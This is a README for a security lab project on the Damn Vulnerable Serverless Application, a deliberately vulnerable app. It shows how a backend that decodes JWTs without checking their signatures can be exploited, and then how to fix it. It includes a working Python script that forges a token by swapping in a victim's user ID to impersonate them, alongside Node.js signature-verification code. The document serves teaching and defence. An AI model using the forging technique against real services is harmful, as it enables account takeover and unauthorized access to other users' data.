DVSA Broken Authentication (JWT) — Exploit & Fix
📌 Overview

This project demonstrates a Broken Authentication vulnerability in the AWS DVSA (Damn Vulnerable Serverless Application).

The vulnerability occurs because the backend:

decodes JWT tokens
but does NOT verify their signature

This allows an attacker to:

modify the JWT payload
impersonate another user
access unauthorized data

The project also includes a secure fix using proper JWT verification with AWS Cognito.

🎯 Objectives
Understand how JWT-based authentication works
Exploit improper JWT validation
Demonstrate user impersonation
Implement a secure fix using signature verification
🏗️ Tech Stack
AWS Serverless (Lambda, API Gateway, Cognito, DynamoDB)
PowerShell (Windows)
Python (helper scripts)
Node.js (fix implementation)
⚙️ Setup Instructions
1. Install AWS CLI (Windows PowerShell)
Invoke-WebRequest "https://awscli.amazonaws.com/AWSCLIV2.msi" -OutFile "AWSCLIV2.msi"
Start-Process msiexec.exe -Wait -ArgumentList '/i AWSCLIV2.msi'

Verify:

aws --version
2. Set Environment Variables
$env:API="https://<API_ID>.execute-api.us-east-1.amazonaws.com/dvsa/order"
$env:TOKEN_B="USER_B_TOKEN"
$env:TOKEN_C="USER_C_TOKEN"
$env:VICTIM_USER="USER_C_SUB"
$env:ORDER_C="VICTIM_ORDER_ID"
$env:FAKE_AS_C="FORGED_TOKEN"
🔍 Exploit Steps
Step 1 — Capture Tokens
Open DVSA in browser
Use DevTools → Network tab
Extract:
API URL
Authorization tokens for User B and User C
Step 2 — Decode Tokens
python scripts/decode.py
scripts/decode.py
import os, json, base64

def decode(token):
    payload = token.split(".")[1]
    payload += "=" * (-len(payload) % 4)
    return json.loads(base64.urlsafe_b64decode(payload.encode()))

for name in ["TOKEN_B", "TOKEN_C"]:
    data = decode(os.environ[name])
    print("\n" + name)
    print("username:", data.get("username"))
    print("sub:", data.get("sub"))
Step 3 — Verify Normal Behavior
Invoke-RestMethod -Uri $env:API -Method Post -Headers @{
    "Content-Type"="application/json"
    "Authorization"=$env:TOKEN_B
} -Body (@{ action="orders" } | ConvertTo-Json -Compress)

Expected:

Only User B’s orders are returned
Step 4 — Forge JWT
python scripts/forge.py
scripts/forge.py
import os, json, base64

t = os.environ["TOKEN_B"]
victim = os.environ["VICTIM_USER"]

h, p, s = t.split(".")
p += "=" * (-len(p) % 4)

data = json.loads(base64.urlsafe_b64decode(p.encode()))

data["username"] = victim
data["sub"] = victim

newp = base64.urlsafe_b64encode(
    json.dumps(data, separators=(",", ":")).encode()
).rstrip(b"=").decode()

fake_token = f"{h}.{newp}.{s}"

print(fake_token)
Step 5 — Exploit Behavior

Use the forged token in API requests.

Observed:

Backend accepts modified token
Victim data becomes accessible OR
Backend errors reveal insecure logic
🚨 Vulnerability Details
Type

Broken Authentication (JWT Validation Failure)

Root Cause
JWT payload is trusted without verifying signature
No validation of token integrity
Impact
User impersonation
Unauthorized access to sensitive data
Full account takeover risk
🛠️ Fix Implementation
JWT Verification with Cognito JWKS
fix/jwt-verification.js
const https = require('https');
const jose = require('node-jose');

let _jwksCache = { keystore: null, fetchedAt: 0 };

async function verifyCognitoJwt(jwt) {
  const region = process.env.AWS_REGION;
  const userPoolId = process.env.userpoolid;

  const issuer = `https://cognito-idp.${region}.amazonaws.com/${userPoolId}`;

  const jwksUrl = `https://cognito-idp.${region}.amazonaws.com/${userPoolId}/.well-known/jwks.json`;

  const jwks = await fetch(jwksUrl).then(r => r.json());
  const keystore = await jose.JWK.asKeyStore(jwks);

  const result = await jose.JWS.createVerify(keystore).verify(jwt);
  const claims = JSON.parse(result.payload.toString("utf8"));

  if (claims.iss !== issuer) throw new Error("bad issuer");

  return claims;
}
Secure Auth Handling
fix/auth-snippet.js
var auth_header = (headers.Authorization || headers.authorization || "");
var jwt = auth_header.replace(/^Bearer\s+/i, "").trim();

if (!jwt) {
  return callback(null, resp(401, { status: "err", msg: "missing authorization" }));
}

verifyCognitoJwt(jwt).then((claims) => {
  var user = claims.username || claims["cognito:username"] || claims.sub;
});
Error Handling
fix/catch-snippet.js
.catch((e) => {
  console.log("JWT verify failed:", e);
  return callback(null, resp(401, { status: "err", msg: "invalid token" }));
});
✅ Post-Fix Behavior
Forged tokens are rejected
Only valid JWTs are accepted
Users can access only their own data
📁 Repository Structure
dvsa-broken-auth/
├── README.md
├── scripts/
│   ├── decode.py
│   └── forge.py
├── fix/
│   ├── jwt-verification.js
│   ├── auth-snippet.js
│   └── catch-snippet.js
├── evidence/
│   ├── screenshots/
│   └── outputs/
🧠 Key Takeaway

Breaking authentication is more severe than typical injection attacks because it allows attackers to become trusted users. Once identity is compromised, all authorization mechanisms fail.